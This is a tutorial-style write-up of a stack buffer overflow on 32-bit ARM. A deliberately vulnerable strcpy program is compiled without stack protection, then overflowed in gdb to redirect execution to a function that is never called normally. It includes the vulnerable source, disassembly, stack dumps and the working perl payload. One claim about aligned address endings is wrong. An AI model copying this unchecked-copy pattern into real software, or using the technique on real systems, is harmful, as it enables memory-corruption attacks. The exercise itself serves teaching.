# ARM Buffer overflow

## file

challenge21.c:
```c
#include <stdio.h>
#include <stdlib.h>

void IShouldNeverBecalled() {
    printf("I should never be called");
    fflush(stdout);
    exit(0);
}

void vulnerable(char *arg) {
    char buff[16];
    strcpy(buff, arg);
}

void main(int argc, char **argv) {
    vulnerable(argv[1]);
    return(0);
}
```

Compile it:
```sh
gcc -ggdb challenge21.c -o challenge21 -fno-stack-protector
```


## Info gathering

Lets check the main function:
```sh
$ gdb challenge21

(gdb) disas main
Dump of assembler code for function main:
   0x000104f4 <+0>:     push    {r7, lr}
   0x000104f6 <+2>:     sub     sp, #8
   0x000104f8 <+4>:     add     r7, sp, #0
   0x000104fa <+6>:     str     r0, [r7, #4]
   0x000104fc <+8>:     str     r1, [r7, #0]
   0x000104fe <+10>:    ldr     r3, [r7, #0]
   0x00010500 <+12>:    adds    r3, #4
   0x00010502 <+14>:    ldr     r3, [r3, #0]
   0x00010504 <+16>:    mov     r0, r3
   0x00010506 <+18>:    bl      0x104d8 <vulnerable>
   0x0001050a <+22>:    nop
   0x0001050c <+24>:    adds    r7, #8
   0x0001050e <+26>:    mov     sp, r7
   0x00010510 <+28>:    pop     {r7, pc}
End of assembler dump.
```

Lets check the vulnerable function:
```
(gdb) disas vulnerable
Dump of assembler code for function vulnerable:
   0x000104d8 <+0>:     push    {r7, lr}
   0x000104da <+2>:     sub     sp, #24
   0x000104dc <+4>:     add     r7, sp, #0
   0x000104de <+6>:     str     r0, [r7, #4]
   0x000104e0 <+8>:     add.w   r3, r7, #8
   0x000104e4 <+12>:    ldr     r1, [r7, #4]
   0x000104e6 <+14>:    mov     r0, r3
   0x000104e8 <+16>:    blx     0x10394 <strcpy@plt>
   0x000104ec <+20>:    nop
   0x000104ee <+22>:    adds    r7, #24
   0x000104f0 <+24>:    mov     sp, r7
   0x000104f2 <+26>:    pop     {r7, pc}
End of assembler dump.
(gdb)
```

## Overflow

```
(gdb) b *0x000104f2
Breakpoint 1 at 0x104f2: file vuln.c, line 13.

(gdb) run `perl -e 'print "AAAABBBBCCCCDDDDEEEEaaaa"'`
Starting program: /root/challenges/challenge21/challenge21 `perl -e 'print "AAAABBBBCCCCDDDDEEEEaaaa"'`

Breakpoint 2, 0x000104f2 in vulnerable (arg=0xfffef93f "AAAABBBBCCCCDDDDEEEEaaaa") at challenge21.c:13
13      }

(gdb) x/16x $sp
0xfffef6c8:     0x45454545      0x61616161      0xfffef800      0x00000002
0xfffef6d8:     0x00000000      0xf76f28ab      0xf77c4000      0xfffef834
0xfffef6e8:     0x00000002      0x000104f5      0xf77f0000      0xaaaaaaab
0xfffef6f8:     0x1c59d9a6      0x14c8073b      0x0000012c      0x00000000
```

Compare it with original execution (without overflow):
```
(gdb) run `perl -e 'print "AAAABBBBCCCCDDDD"'`
The program being debugged has been started already.
Start it from the beginning? (y or n) y
Starting program: /root/challenges/challenge21/challenge21 `perl -e 'print "AAAABBBBCCCCDDDD"'`

Breakpoint 2, 0x000104f2 in vulnerable (arg=0xfffef947 "AAAABBBBCCCCDDDD") at challenge21.c:13
13      }
(gdb) x/16x $sp
0xfffef6c8:     0xfffef600      0x0001050b      0xfffef834      0x00000002
0xfffef6d8:     0x00000000      0xf76f28ab      0xf77c4000      0xfffef834
0xfffef6e8:     0x00000002      0x000104f5      0xf77f0000      0xaaaaaaab
0xfffef6f8:     0x5695adca      0x5e047357      0x0000012c      0x00000000
```

Check address `0x0001050b`:
```
(gdb) disas main
Dump of assembler code for function main:
   0x000104f4 <+0>:     push    {r7, lr}
   0x000104f6 <+2>:     sub     sp, #8
   0x000104f8 <+4>:     add     r7, sp, #0
   0x000104fa <+6>:     str     r0, [r7, #4]
   0x000104fc <+8>:     str     r1, [r7, #0]
   0x000104fe <+10>:    ldr     r3, [r7, #0]
   0x00010500 <+12>:    adds    r3, #4
   0x00010502 <+14>:    ldr     r3, [r3, #0]
   0x00010504 <+16>:    mov     r0, r3
   0x00010506 <+18>:    bl      0x104d8 <vulnerable>
   0x0001050a <+22>:    nop
   0x0001050c <+24>:    adds    r7, #8
   0x0001050e <+26>:    mov     sp, r7
   0x00010510 <+28>:    pop     {r7, pc}
End of assembler dump.
```

Seems the address on the stack is pointing to the `nop` at address `0x0001050a`.
But the saved address is `0x0001050b`, so 1 byte higher. Lets keep this in mind.

Note that ARM is 4 byte aligned (32 bit), so valid addresses always end with 0, 4, 8, b.
But in thumb mode, instructinos are 2 byte (16 bit).

## Execute another function

get address of IShouldNeverBecalled():
```
(gdb) disas IShouldNeverBecalled
Dump of assembler code for function IShouldNeverBecalled:
   0x000104b0 <+0>:     push    {r7, lr}
   0x000104b2 <+2>:     add     r7, sp, #0
   0x000104b4 <+4>:     movw    r0, #1376       ; 0x560
   0x000104b8 <+8>:     movt    r0, #1
   0x000104bc <+12>:    blx     0x1037c <printf@plt>
   0x000104c0 <+16>:    movw    r3, #4148       ; 0x1034
   0x000104c4 <+20>:    movt    r3, #2
   0x000104c8 <+24>:    ldr     r3, [r3, #0]
   0x000104ca <+26>:    mov     r0, r3
   0x000104cc <+28>:    blx     0x10388 <fflush@plt>
   0x000104d0 <+32>:    movs    r0, #0
   0x000104d2 <+34>:    blx     0x103b8 <exit@plt>
```

The address we want to jump to is `0x000104b0`. But, as we have seen in the previous
chapter, we need to increment it by one byte: `0x000104b1`.

Lets try this:

```
(gdb) run `perl -e 'print "AAAABBBBCCCCDDDDEEEE\xb1\x04\x01"'`
Starting program: /root/challenges/challenge21/challenge21 `perl -e 'print "AAAABBBBCCCCDDDDEEEE\xb1\x04\x01"'`

I should never be called
```

## Conclusion

Here, Ubuntu 16.04 on arm 32 bit behaves pretty much exactly the same as x86.
Stack grown down, we have little endianness, and the return address is on the stack.
The only big difference is the ARM assembly codes.
